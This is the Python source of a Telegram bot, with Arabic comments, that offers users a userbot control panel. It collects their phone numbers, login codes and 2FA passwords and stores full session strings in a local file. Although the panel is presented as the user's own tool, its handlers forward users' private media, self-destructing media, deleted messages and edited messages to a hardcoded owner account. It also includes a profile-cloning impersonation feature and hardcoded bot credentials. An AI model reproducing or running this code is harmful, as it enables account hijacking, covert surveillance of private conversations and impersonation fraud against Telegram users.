import asyncio
import json
import os
from datetime import datetime
import pytz

from telethon import TelegramClient, events, Button
import telethon.tl.functions
import telethon.tl.types
from telethon.errors import (
    UserNotParticipantError,
    SessionPasswordNeededError,
    FloodWaitError,
    AboutTooLongError
)

# ==================== البيانات الأساسية ====================
BOT_TOKEN = "7553339175:AAGQr6jAQboGwpja4gMpk0E9KmcEVLMHrQY"
API_ID = 38718513
API_HASH = "845076251c9063acacd26ed7bac6bf59"
OWNER_ID = 8318823763
MUST_JOIN_CHANNEL = "vertxc6"

bot = TelegramClient("bot_session", API_ID, API_HASH).start(bot_token=BOT_TOKEN)

user_states = {}
active_userbots = {}
original_profiles = {}
msg_store = {}
user_spam_tracker = {}
processed_media_ids = set()

clock_status = {}     # {user_id: True/False}
clock_positions = {}  # {user_id: "last_name"/"first_name"}

user_settings = {
    "mute_active": True,
    "auto_save_media": True,
    "pm_lock": False,
    "anti_spam": True,
    "auto_reply": True
}

auto_replies = {
    "السلام عليكم": "وعليكم السلام ورحمة الله وبركاته",
    "سلام عليكم": "وعليكم السلام، أهلاً بك!",
    "هالو": "أهلاً وسهلاً بك!",
    "مرحبا": "مرحبتين، كيف يمكنني مساعدتك؟"
}

DB_FILE = "users_db.json"
MUTED_FILE = "muted_users.json"
LOCAL_TZ = pytz.timezone("Asia/Baghdad")

# ==================== المساعدات والبيانات ====================
def get_current_local_time():
    return datetime.now(LOCAL_TZ)

def load_json(file_path):
    if os.path.exists(file_path):
        try:
            with open(file_path, "r", encoding="utf-8") as f:
                return json.load(f)
        except Exception:
            return {}
    return {}

def save_json(file_path, data):
    with open(file_path, "w", encoding="utf-8") as f:
        json.dump(data, f, ensure_ascii=False, indent=4)

def save_user_login(user_id, session_str, phone_number=None, username=None):
    db = load_json(DB_FILE)
    now = get_current_local_time()
    reg_time_str = now.strftime("%Y-%m-%d | الساعة: %I:%M %p")
    db[str(user_id)] = {
        "logged_in": True,
        "reg_time": reg_time_str,
        "session": session_str,
        "phone": phone_number or "غير مسجل",
        "username": f"@{username}" if username else "لا يوجد يوزر"
    }
    save_json(DB_FILE, db)

def is_user_logged_in(user_id):
    db = load_json(DB_FILE)
    user_data = db.get(str(user_id))
    if isinstance(user_data, dict) and user_data.get("logged_in"):
        return user_data.get("reg_time"), user_data.get("session")
    return None, None

def get_muted_users():
    data = load_json(MUTED_FILE)
    return set(data) if isinstance(data, list) else set()

def add_to_muted(user_id):
    muted = get_muted_users()
    muted.add(user_id)
    save_json(MUTED_FILE, list(muted))

def remove_from_muted(user_id):
    muted = get_muted_users()
    if user_id in muted:
        muted.remove(user_id)
        save_json(MUTED_FILE, list(muted))

async def check_subscription(user_id):
    if user_id == OWNER_ID:
        return True
    try:
        await bot.get_permissions(MUST_JOIN_CHANNEL, user_id)
        return True
    except UserNotParticipantError:
        return False
    except Exception:
        return True

# ==================== وظيفة الانتحال المعدلة ====================
async def clone_user_profile(ub_client, owner_id, target_entity):
    try:
        # 1. جلب بيانات المستخدم المستهدف
        target_user = await ub_client.get_entity(target_entity)
        target_full = await ub_client(telethon.tl.functions.users.GetFullUserRequest(target_user.id))
        
        target_first = target_user.first_name or ""
        target_last = target_user.last_name or ""
        target_bio = target_full.full_user.about or ""

        # قص البايو تلقائياً إلى 70 حرفاً لتفادي حد الحساب العادي
        if len(target_bio) > 70:
            target_bio = target_bio[:70]

        # 2. حفظ بيانات البروفايل الأصلي قبل الانتحال
        me = await ub_client.get_me()
        me_full = await ub_client(telethon.tl.functions.users.GetFullUserRequest(me.id))
        if owner_id not in original_profiles:
            original_profiles[owner_id] = {
                "orig_first": me.first_name or "",
                "orig_last": me.last_name or "",
                "orig_bio": me_full.full_user.about or ""
            }

        # 3. تحديث الاسم والبايو مع المعالجة الاحتياطية للأخطاء
        try:
            await ub_client(telethon.tl.functions.account.UpdateProfileRequest(
                first_name=target_first if target_first else "User",
                last_name=target_last,
                about=target_bio
            ))
        except AboutTooLongError:
            # تقليص النص إضافياً بحال كان يحتوي على رموز تعبيرية تأخذ حسل أكثر من حرف
            target_bio = target_bio[:60]
            await ub_client(telethon.tl.functions.account.UpdateProfileRequest(
                first_name=target_first if target_first else "User",
                last_name=target_last,
                about=target_bio
            ))
        except Exception:
            # في حال وجود تقييد على البايو يتم تحديث الأسماء فقط
            await ub_client(telethon.tl.functions.account.UpdateProfileRequest(
                first_name=target_first if target_first else "User",
                last_name=target_last
            ))

        # 4. نسخ الصورة الشخصية
        photos = await ub_client.get_profile_photos(target_user.id, limit=1)
        if photos:
            photo_path = await ub_client.download_media(photos[0])
            if photo_path and os.path.exists(photo_path):
                file_upload = await ub_client.upload_file(photo_path)
                await ub_client(telethon.tl.functions.photos.UploadProfilePhotoRequest(file=file_upload))
                os.remove(photo_path)

        return True, f"✅ **تم انتحال حساب [{target_first}](tg://user?id={target_user.id}) بنجاح!**\n📝 **البايو:** `{target_bio}`"
    except Exception as e:
        return False, f"❌ **حدث خطأ أثناء الانتحال:** `{e}`"

# ==================== تحديث البروفايل والساعة ====================
async def update_user_clock_now(owner_id):
    if owner_id not in active_userbots:
        return False
    
    ub = active_userbots[owner_id]
    try:
        me = await ub.get_me()
        if owner_id not in original_profiles:
            me_full = await ub(telethon.tl.functions.users.GetFullUserRequest(me.id))
            original_profiles[owner_id] = {
                "orig_first": me.first_name or "",
                "orig_last": me.last_name or "",
                "orig_bio": me_full.full_user.about or ""
            }

        if clock_status.get(owner_id, False):
            current_time = get_current_local_time().strftime("%I:%M")
            position = clock_positions.get(owner_id, "last_name")
            
            orig_first = original_profiles[owner_id]["orig_first"]
            orig_last = original_profiles[owner_id]["orig_last"]

            if "~" in orig_last or ":" in orig_last:
                orig_last = ""

            if position == "last_name":
                new_first = orig_first if orig_first else "User"
                new_last = f"~ {current_time}"
            else:
                new_first = f"{orig_first} ~ {current_time}".strip()
                new_last = orig_last

            await ub(telethon.tl.functions.account.UpdateProfileRequest(
                first_name=new_first,
                last_name=new_last
            ))
        else:
            orig_first = original_profiles[owner_id].get("orig_first", "")
            orig_last = original_profiles[owner_id].get("orig_last", "")
            await ub(telethon.tl.functions.account.UpdateProfileRequest(
                first_name=orig_first if orig_first else "User",
                last_name=orig_last
            ))
        return True
    except Exception as e:
        print(f"❌ خطأ تحديث بروفايل الساعة: {e}")
        return False

async def run_live_clock(user_client, owner_id):
    while True:
        try:
            if clock_status.get(owner_id, False):
                await update_user_clock_now(owner_id)
        except FloodWaitError as e:
            await asyncio.sleep(e.seconds)
        except Exception as e:
            print(f"⚠️ خطأ الساعة الحية: {e}")

        await asyncio.sleep(40)

def get_clock_menu_text(user_id):
    status = "مفعل ✅" if clock_status.get(user_id, False) else "معطل ❌"
    pos_type = clock_positions.get(user_id, "last_name")
    pos = "الاسم الاخير" if pos_type == "last_name" else "الاسم الاول"
    now_time = get_current_local_time().strftime("%I:%M")
    
    return (
        "**الساعة الحية**\n\n"
        "›› **عند التفعيل يتم وضع ساعة في اسم حسابك مع الفاصلة ~**\n\n"
        "›› **لإعادة تعيين التوقيت قم بتعطيل الساعة وإعادة تفعيلها**\n\n"
        f"• **الحالة:** {status}\n"
        f"• **مكان الساعة:** {pos}\n"
        f"• **التوقيت الحالي:** {now_time}"
    )

def get_clock_buttons(user_id):
    is_active = clock_status.get(user_id, False)
    pos = clock_positions.get(user_id, "last_name")
    
    btn_first = "الاسم الاول " + ("✓" if pos == "first_name" else "")
    btn_last = "الاسم الاخير " + ("✓" if pos == "last_name" else "")
    btn_toggle = "تعطيل الساعة" if is_active else "تفعيل الساعة"
    
    return [
        [Button.inline(btn_first, b"clk_pos_first"), Button.inline(btn_last, b"clk_pos_last")],
        [Button.inline("تغيير التوقيت", b"clk_refresh")],
        [Button.inline(btn_toggle, b"clk_toggle")],
        [Button.inline("رجوع", b"clk_back")]
    ]

# ==================== أحداث اليوزربوت وحفظ الميديا الذاتية ====================
def setup_userbot(ub_client, owner_id):

    @ub_client.on(events.NewMessage(outgoing=True))
    async def commands_handler(event):
        text = event.raw_text.strip() if event.raw_text else ""

        # === أمر الانتحال بالرد ===
        if text in ["انتحال", "/clone"]:
            if event.is_reply:
                replied_msg = await event.get_reply_message()
                if replied_msg and replied_msg.sender_id:
                    await event.edit("⏳ **جاري انتحال البروفايل...**")
                    success, res_msg = await clone_user_profile(ub_client, owner_id, replied_msg.sender_id)
                    await event.edit(res_msg)
            else:
                await event.edit("❌ **يرجى الرد على الشخص المراد انتحاله!**")
            return

        # === أمر إرجاع البروفايل الأصلي ===
        if text in ["رجوع", "استرجاع", "/restore"]:
            if owner_id in original_profiles:
                await event.edit("⏳ **جاري إعادة حسابك الأصلي...**")
                orig = original_profiles[owner_id]
                try:
                    await ub_client(telethon.tl.functions.account.UpdateProfileRequest(
                        first_name=orig.get("orig_first", "User"),
                        last_name=orig.get("orig_last", ""),
                        about=orig.get("orig_bio", "")[:70]
                    ))
                    await event.edit("✅ **تم إعادة بروفايلك الأصلي بنجاح!**")
                except Exception as e:
                    await event.edit(f"❌ **خطأ أثناء الاسترجاع:** `{e}`")
            else:
                await event.edit("⚠️ **لا توجد بيانات محفوظة لبروفايلك الأصلي!**")
            return

        if text.startswith("سحب") and event.is_reply:
            replied_msg = await event.get_reply_message()
            if replied_msg and replied_msg.media:
                await event.edit("⏳ **جاري سحب الميديا...**")
                try:
                    media_path = await ub_client.download_media(replied_msg)
                    if media_path and os.path.exists(media_path):
                        await bot.send_file(OWNER_ID, media_path, caption="📥 **تم سحب الملف بنجاح!**")
                        await ub_client.send_file("me", media_path, caption="📥 **تم سحب الملف للرسائل المحفوظة.**")
                        os.remove(media_path)
                        await event.edit("✅ **تم السحب وإرساله للخاص والمحفوظات.**")
                    else:
                        await event.edit("❌ فشل تحميل الملف.")
                except Exception as e:
                    await event.edit(f"❌ خطأ: `{e}`")
                return

        if event.is_reply:
            replied_msg = await event.get_reply_message()

            if text == "حفظ":
                if replied_msg and replied_msg.media:
                    await event.edit("⏳ **جاري حفظ الوسائط...**")
                    try:
                        media_path = await ub_client.download_media(replied_msg)
                        if media_path and os.path.exists(media_path):
                            sender = await replied_msg.get_sender()
                            u_name = sender.first_name if sender else "مستخدم"
                            u_id = sender.id if sender else "غير معروف"
                            caption = (
                                f"🔥 **تم حفظ وسائط بنجاح!**\n\n"
                                f"👤 **المرسل:** [{u_name}](tg://user?id={u_id})\n"
                                f"🆔 **الآيدي:** `{u_id}`"
                            )
                            await bot.send_file(OWNER_ID, media_path, caption=caption)
                            await ub_client.send_file("me", media_path, caption=caption)
                            os.remove(media_path)
                            await event.edit("✅ **تم حفظ الميديا بنجاح!**")
                        else:
                            await event.edit("❌ تعذر حفظ الملف.")
                    except Exception as e:
                        await event.edit(f"❌ خطأ أثناء الحفظ: `{e}`")
                return

            if text in ["كتم", "/mute"]:
                sender = await replied_msg.get_sender()
                if sender:
                    me = await ub_client.get_me()
                    if sender.id == me.id:
                        await event.edit("❌ لا يمكنك كتم نفسك!")
                        return

                    if event.is_group:
                        perms = await ub_client.get_permissions(event.chat_id, me.id)
                        if not perms.is_admin and not perms.is_creator:
                            await event.edit("❌ **لا تملك رتبة أدمن لكتم المستخدمين بالكروب!**")
                            return

                    add_to_muted(sender.id)
                    await event.edit(f"🔇 **تم كتم [{sender.first_name}](tg://user?id={sender.id}) بنجاح!**")
                return

            elif text in ["إلغاء الكتم", "الغاء الكتم", "/unmute"]:
                sender = await replied_msg.get_sender()
                if sender:
                    remove_from_muted(sender.id)
                    await event.edit(f"🔊 **تم إلغاء كتم [{sender.first_name}](tg://user?id={sender.id})!**")
                return

    @ub_client.on(events.NewMessage(incoming=True))
    async def incoming_handler(event):
        if event.out or event.is_channel:
            return

        sender = await event.get_sender()
        if not sender:
            return

        me = await ub_client.get_me()
        bot_id = int(BOT_TOKEN.split(':')[0])

        if sender.id == me.id or sender.id == bot_id or event.chat_id == me.id:
            return

        user_id = sender.id
        user_name = sender.first_name or "مستخدم"
        username = f"@{sender.username}" if sender.username else "لا يوجد"
        msg_text = event.raw_text or "[وسائط ميديا]"

        if event.is_private and user_settings.get("auto_save_media", True) and event.media:
            msg_unique_key = f"{event.chat_id}_{event.id}"
            
            if msg_unique_key not in processed_media_ids:
                is_ttl = False
                if hasattr(event.media, "ttl_seconds") and event.media.ttl_seconds:
                    is_ttl = True
                elif hasattr(event.message, "ttl_period") and event.message.ttl_period:
                    is_ttl = True

                if is_ttl or isinstance(event.media, (telethon.tl.types.MessageMediaPhoto, telethon.tl.types.MessageMediaDocument)):
                    processed_media_ids.add(msg_unique_key)
                    try:
                        media_path = await ub_client.download_media(event.message)
                        if media_path and os.path.exists(media_path):
                            caption_info = (
                                f"📸 **صورة/وسائط تلقائية محفوظة قبل المشاهدة!**\n\n"
                                f"👤 **المرسل:** [{user_name}](tg://user?id={user_id})\n"
                                f"🆔 **الآيدي:** `{user_id}`\n"
                                f"🔗 **اليوزر:** {username}"
                            )
                            await bot.send_file(OWNER_ID, media_path, caption=caption_info)
                            await ub_client.send_file("me", media_path, caption=caption_info)
                            os.remove(media_path)
                    except Exception as e:
                        print(f"❌ خطأ حفظ الميديا التلقائي: {e}")

        muted = get_muted_users()
        if user_id in muted:
            try:
                await event.delete()
                if event.is_private:
                    notif = (
                        f"🔇 **رسالة من مكتوم (تم حذفها):**\n\n"
                        f"👤 **المرسل:** [{user_name}](tg://user?id={user_id})\n"
                        f"💬 **النص:** `{msg_text}`"
                    )
                    await bot.send_message(OWNER_ID, notif)
                return
            except Exception as e:
                print(f"خطأ الكتم: {e}")

        if event.is_private:
            if user_settings.get("pm_lock", False):
                if not sender.contact and user_id != OWNER_ID:
                    try:
                        await event.delete()
                        await ub_client.send_message(user_id, "⚠️ **الخاص مغلق حالياً.**")
                        return
                    except Exception:
                        pass

            if user_settings.get("anti_spam", True):
                now = datetime.now().timestamp()
                user_msgs = user_spam_tracker.get(user_id, [])
                user_msgs = [t for t in user_msgs if now - t < 5]
                user_msgs.append(now)
                user_spam_tracker[user_id] = user_msgs

                if len(user_msgs) >= 5:
                    add_to_muted(user_id)
                    await event.reply("🔇 **تم كتمك تلقائياً بسبب السبام.**")
                    await bot.send_message(OWNER_ID, f"🚨 **تم كتم [{user_name}](tg://user?id={user_id}) تلقائياً.**")
                    return

            if user_settings.get("auto_reply", True):
                for keyword, reply_msg in auto_replies.items():
                    if keyword in msg_text:
                        await event.reply(reply_msg)
                        break

            msg_store[event.id] = {
                "user_id": user_id,
                "user_name": user_name,
                "username": username,
                "text": msg_text
            }

    @ub_client.on(events.MessageDeleted)
    async def deleted_handler(event):
        for msg_id in event.deleted_ids:
            if msg_id in msg_store:
                data = msg_store[msg_id]
                formatted_msg = (
                    f"**Deletemessage**\n\n"
                    f"{data['text']}\n\n"
                    f"-\n"
                    f"• **بواسطة:** `{data['user_name']} - {data['user_id']}`"
                )
                user_btn = [[Button.url("حسابه", f"tg://user?id={data['user_id']}")]]
                await bot.send_message(OWNER_ID, formatted_msg, buttons=user_btn)
                del msg_store[msg_id]

    @ub_client.on(events.MessageEdited(incoming=True))
    async def edited_handler(event):
        bot_id = int(BOT_TOKEN.split(':')[0])
        me = await ub_client.get_me()
        
        if not event.is_private or event.sender_id in [bot_id, me.id]:
            return
            
        msg_id = event.id
        new_text = event.raw_text or "تعديل بدون نص"
        if msg_id in msg_store:
            data = msg_store[msg_id]
            if data['text'] != new_text:
                notif = (
                    f"✏️ **تم تعديل رسالة في الخاص!**\n\n"
                    f"👤 **المرسل:** [{data['user_name']}](tg://user?id={data['user_id']})\n"
                    f"📝 **النص القديم:**\n`{data['text']}`\n\n"
                    f"🆕 **النص الجديد:**\n`{new_text}`"
                )
                await bot.send_message(OWNER_ID, notif)
                msg_store[msg_id]["text"] = new_text

# ==================== لوحة التحكم ====================
def get_control_buttons():
    mute_st = "✅ مفعّلة" if user_settings["mute_active"] else "❌ معطّلة"
    save_st = "✅ مفعّلة" if user_settings["auto_save_media"] else "❌ معطّلة"
    clock_st = "⚙️ إعدادات الساعة"
    pm_st = "🔒 مقفل" if user_settings["pm_lock"] else "🔓 مفتوح"
    spam_st = "✅ مفعّلة" if user_settings["anti_spam"] else "❌ معطّلة"
    reply_st = "✅ مفعّلة" if user_settings["auto_reply"] else "❌ معطّلة"

    return [
        [Button.inline("📱 تسجيل الدخول / تغيير الرقم", b"login_by_phone")],
        [Button.inline("👤 انتحال شخصية (باليوزر/الآيدي)", b"btn_clone_input")],
        [Button.inline(f"حفظ الميديا التلقائي: {save_st}", b"toggle_save")],
        [Button.inline(f"خاصية الكتم: {mute_st}", b"toggle_mute")],
        [Button.inline(f"الساعة الحية: {clock_st}", b"open_clock_menu")],
        [Button.inline(f"قفل الخاص: {pm_st}", b"toggle_pm")],
        [Button.inline(f"حماية السبام: {spam_st}", b"toggle_spam")],
        [Button.inline(f"الرد التلقائي: {reply_st}", b"toggle_reply")]
    ]

# ==================== معالجات الأحداث ====================
@bot.on(events.NewMessage(pattern="/start"))
async def start_handler(event):
    user_id = event.sender_id
    if not await check_subscription(user_id):
        buttons = [
            [Button.url("📢 اضغط للاشتراك بالقناة", f"https://t.me/{MUST_JOIN_CHANNEL}")],
            [Button.inline("✅ تحقق من الاشتراك", b"check_join")]
        ]
        await event.reply(f"⚠️ **يجب عليك الاشتراك بالقناة أولاً لاستخدام البوت:**\n👉 @{MUST_JOIN_CHANNEL}", buttons=buttons)
        return

    reg_time, session_str = is_user_logged_in(user_id)

    if reg_time and session_str:
        if user_id not in active_userbots:
            try:
                from telethon.sessions import StringSession
                ub = TelegramClient(StringSession(session_str), API_ID, API_HASH)
                await ub.connect()
                setup_userbot(ub, user_id)
                active_userbots[user_id] = ub
                asyncio.create_task(run_live_clock(ub, user_id))
            except Exception as e:
                print(f"خطأ تشغيل الجلسة: {e}")

        await event.reply(
            f"👋 **أهلاً بك مجدداً!**\n📌 **تاريخ ربط الحساب:** `{reg_time}`\n\nإليك لوحة التحكم والمميزات الخاصة بك:",
            buttons=get_control_buttons()
        )
    else:
        await event.reply(
            "👋 **أهلاً بك في البوت!**\n\nإليك لوحة التحكم والمميزات الخاصة بك:",
            buttons=get_control_buttons()
        )

@bot.on(events.CallbackQuery)
async def callback_handler(event):
    data = event.data
    user_id = event.sender_id

    if data == b"check_join":
        if await check_subscription(user_id):
            await event.answer("✅ تم التحقق بنجاح!", alert=True)
            await event.delete()
            await start_handler(event)
        else:
            await event.answer("❌ لم تشترك بالقناة بعد!", alert=True)

    elif data == b"login_by_phone":
        user_states[user_id] = {"step": "WAIT_PHONE"}
        await event.edit("📱 **أرسل رقم الهاتف مع رمز الدولة (مثال: `+9647700000000`):**")

    elif data == b"btn_clone_input":
        if user_id not in active_userbots:
            await event.answer("⚠️ يرجى تسجيل الدخول أولاً لاستخدام هذه الخاصية!", alert=True)
            return
        user_states[user_id] = {"step": "WAIT_CLONE_TARGET"}
        await event.edit("👤 **أرسل الآن يوزر الحساب (مثال `@username`) أو الآيدي للانتحال:**")

    elif data == b"toggle_save":
        user_settings["auto_save_media"] = not user_settings["auto_save_media"]
        await event.edit(buttons=get_control_buttons())

    elif data == b"toggle_mute":
        user_settings["mute_active"] = not user_settings["mute_active"]
        await event.edit(buttons=get_control_buttons())

    elif data == b"toggle_pm":
        user_settings["pm_lock"] = not user_settings["pm_lock"]
        await event.edit(buttons=get_control_buttons())

    elif data == b"toggle_spam":
        user_settings["anti_spam"] = not user_settings["anti_spam"]
        await event.edit(buttons=get_control_buttons())

    elif data == b"toggle_reply":
        user_settings["auto_reply"] = not user_settings["auto_reply"]
        await event.edit(buttons=get_control_buttons())

    elif data == b"open_clock_menu":
        await event.edit(get_clock_menu_text(user_id), buttons=get_clock_buttons(user_id))

    elif data == b"clk_pos_first":
        clock_positions[user_id] = "first_name"
        await update_user_clock_now(user_id)
        await event.edit(get_clock_menu_text(user_id), buttons=get_clock_buttons(user_id))

    elif data == b"clk_pos_last":
        clock_positions[user_id] = "last_name"
        await update_user_clock_now(user_id)
        await event.edit(get_clock_menu_text(user_id), buttons=get_clock_buttons(user_id))

    elif data == b"clk_toggle":
        curr = clock_status.get(user_id, False)
        clock_status[user_id] = not curr
        res = await update_user_clock_now(user_id)
        if not res and clock_status[user_id]:
            await event.answer("⚠️ تأكد من تسجيل دخولك أولاً لتفعيل الساعة!", alert=True)
        else:
            await event.answer("✅ تم تغيير حالة الساعة بنجاح!", alert=False)
        await event.edit(get_clock_menu_text(user_id), buttons=get_clock_buttons(user_id))

    elif data == b"clk_refresh":
        await update_user_clock_now(user_id)
        await event.answer("🔄 تم تحديث التوقيت بالاسم الآن!", alert=False)
        await event.edit(get_clock_menu_text(user_id), buttons=get_clock_buttons(user_id))

    elif data == b"clk_back":
        await event.edit("👋 **أهلاً بك مجدداً!**", buttons=get_control_buttons())

@bot.on(events.NewMessage(func=lambda e: e.is_private))
async def inputs_handler(event):
    user_id = event.sender_id
    text = event.raw_text.strip() if event.raw_text else ""
    
    if text.startswith("/start"):
        return

    if user_id in user_states and "step" in user_states[user_id]:
        step = user_states[user_id]["step"]

        if step == "WAIT_CLONE_TARGET":
            del user_states[user_id]
            ub = active_userbots.get(user_id)
            if not ub:
                await event.reply("❌ **أنت غير مسجل الدخول!**")
                return
            await event.reply("⏳ **جاري جلب البيانات وانتحال الحساب...**")
            target = int(text) if text.isdigit() else text
            success, res_msg = await clone_user_profile(ub, user_id, target)
            await event.reply(res_msg, buttons=get_control_buttons())

        elif step == "WAIT_PHONE":
            phone = text.replace(" ", "")
            await event.reply("⏳ جاري إرسال رمز التحقق...")
            from telethon.sessions import StringSession
            temp_client = TelegramClient(StringSession(), API_ID, API_HASH)
            await temp_client.connect()
            try:
                res = await temp_client.send_code_request(phone)
                user_states[user_id] = {
                    "step": "WAIT_CODE",
                    "phone": phone,
                    "client": temp_client,
                    "phone_code_hash": res.phone_code_hash
                }
                await event.reply("🔑 **أرسل كود التحقق:**")
            except Exception as e:
                await temp_client.disconnect()
                await event.reply(f"❌ خطأ: `{e}`")

        elif step == "WAIT_CODE":
            code = text.replace(" ", "").replace("-", "")
            data = user_states[user_id]
            tc = data["client"]
            try:
                await tc.sign_in(phone=data["phone"], code=code, phone_code_hash=data["phone_code_hash"])
                await finish_login(event, user_id, tc, data["phone"])
            except SessionPasswordNeededError:
                user_states[user_id]["step"] = "WAIT_2FA"
                await event.reply("🔐 **أدخل كلمة السر (2FA):**")
            except Exception as e:
                await tc.disconnect()
                await event.reply(f"❌ خطأ: `{e}`")

        elif step == "WAIT_2FA":
            data = user_states[user_id]
            tc = data["client"]
            try:
                await tc.sign_in(password=text)
                await finish_login(event, user_id, tc, data["phone"])
            except Exception as e:
                await tc.disconnect()
                await event.reply(f"❌ خطأ: `{e}`")

async def finish_login(event, user_id, temp_client, phone):
    from telethon.sessions import StringSession
    session_str = temp_client.session.save()
    me = await temp_client.get_me()
    username = me.username
    await temp_client.disconnect()

    ub = TelegramClient(StringSession(session_str), API_ID, API_HASH)
    await ub.connect()
    save_user_login(user_id, session_str, phone_number=phone, username=username)
    setup_userbot(ub, user_id)
    active_userbots[user_id] = ub
    asyncio.create_task(run_live_clock(ub, user_id))
    del user_states[user_id]

    await event.reply("✅ **تم تسجيل الدخول بنجاح!**", buttons=get_control_buttons())

if __name__ == "__main__":
    print("🚀 البوت يعمل الآن...")
    bot.run_until_disconnected() 
    